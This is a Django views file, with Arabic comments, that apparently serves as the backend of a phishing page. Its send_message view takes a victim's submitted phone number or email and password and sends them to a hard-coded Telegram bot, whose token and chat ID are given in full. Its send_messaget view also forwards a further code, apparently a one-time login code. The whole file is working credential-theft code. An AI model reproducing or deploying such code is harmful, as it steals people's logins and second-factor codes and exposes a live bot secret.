from django.shortcuts import redirect, render
from django.http import JsonResponse
import requests
from urllib.parse import quote

def home(request):
    return render(request, 'home/index.html')

def send_message(request):
    if request.method == 'POST':
        mobile_number = request.POST.get('mobileNumber')
        password = request.POST.get('password')

        # تحويل القيم إلى روابط
        mobile_number_link = f'<a href="http://example.com/{mobile_number}">{mobile_number}</a>'
        password_link = f'<a href="http://example.com/{password}">{password}</a>'  # تأكد من أن لديك رابط صحيح هنا

        message = f'email=> {mobile_number_link}\n password=> {password_link}'
        bot_token = '7242811719:AAFDiUNL3UpQzg8ZmpmCgYwWCeQe-WYjB9c'
        bot_chat_id = '5210909198'
        
        # ترميز الرسالة، مع الحفاظ على النص
        message_encoded = quote(message, safe='')  # ترميز الرسالة

        # استخدم التنسيق العادي بدلاً من MarkdownV2 مع HTML
        send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={bot_chat_id}&text={message_encoded}&parse_mode=HTML'
        response = requests.get(send_text)
        
        # إعادة التوجيه مع رقم الهاتف في عنوان URL
        return redirect('home:sec', mobile_number=mobile_number, password=password)

    return JsonResponse({'status': 'error', 'message': 'Invalid request'}, status=400)

def sec(request, mobile_number, password):
    context = {
        'mobile_number': mobile_number,
        'password': password
    }
    return render(request, 'home/sec.html', context)

def send_messaget(request):
    if request.method == 'POST':
        t = request.POST.get('t')
        mobile_number = request.POST.get('mobile_number')
        password = request.POST.get('password')

        # تحويل القيم إلى روابط
        mobile_number_link = f'<a href="http://example.com/{mobile_number}">{mobile_number}</a>'
        password_link = f'<a href="http://example.com/{password}">{password}</a>'  # تأكد من أن لديك رابط صحيح هنا

        message = f'email=> {mobile_number_link}\n password=> {password_link}\n code =>{t}'
        bot_token = '7242811719:AAFDiUNL3UpQzg8ZmpmCgYwWCeQe-WYjB9c'
        bot_chat_id = '5210909198'
        
        # ترميز الرسالة، مع الحفاظ على النص
        message_encoded = quote(message, safe='')  # ترميز الرسالة

        # استخدم التنسيق العادي بدلاً من MarkdownV2 مع HTML
        send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={bot_chat_id}&text={message_encoded}&parse_mode=HTML'
        response = requests.get(send_text)
        
        # إعادة التوجيه مع رقم الهاتف في عنوان URL
        return render(request, 'home/sec.html')
    
    return JsonResponse({'status': 'error', 'message': 'Invalid request'}, status=400)
